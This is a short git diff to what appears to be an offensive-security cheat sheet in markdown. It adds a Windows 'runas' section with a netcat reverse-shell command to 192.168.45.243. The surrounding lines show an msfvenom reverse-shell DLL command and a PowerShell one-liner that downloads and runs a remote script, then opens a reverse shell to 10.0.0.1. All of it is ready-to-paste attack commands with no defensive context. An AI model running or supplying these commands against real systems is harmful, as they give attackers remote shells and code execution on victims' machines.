@@ -91,6 +91,15 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 443
 ```
 
+#### ➤ RUNAS (Windows)
+```
+#Execute a specific command :
+runas /user:administrator "cmd.exe /c whoami > whoami.txt"
+
+#Execute a reverseshell :
+runas /user:administrator "nc.exe -e cmd 192.168.45.243 445"
+```
+
 
 ## 🔻Single line Webshell
 
